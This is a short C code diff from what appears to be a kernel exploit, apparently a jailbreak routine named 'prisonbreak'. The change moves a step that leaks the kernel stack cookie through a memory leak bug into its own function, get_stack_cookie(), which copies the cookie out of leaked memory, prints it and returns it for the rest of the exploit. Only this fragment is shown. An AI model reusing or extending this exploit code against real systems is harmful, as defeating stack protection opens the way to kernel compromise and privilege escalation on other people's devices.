@@ -199,7 +199,7 @@ void write_uint64(char *ptr, unsigned int offset, uint64_t value) {
   *u64dest = value;
 }
 
-void* prisonbreak(void* arg) {
+uint64_t get_stack_cookie() {
   /*
    *
    * 1. Get the stack cookie through a kernel memory leak bug
@@ -264,7 +264,12 @@ void* prisonbreak(void* arg) {
   memcpy(&stack_cookie, base + offset_stack_cookie, sizeof(stack_cookie));
   printf("STACK COOKIE: 0x%016" PRIx64 "\n", stack_cookie);
 
-  close(sock);
+  close(sock);  
+  return stack_cookie;
+}
+
+void* prisonbreak(void* arg) {
+  uint64_t stack_cookie = get_stack_cookie();
 
   /*
    *
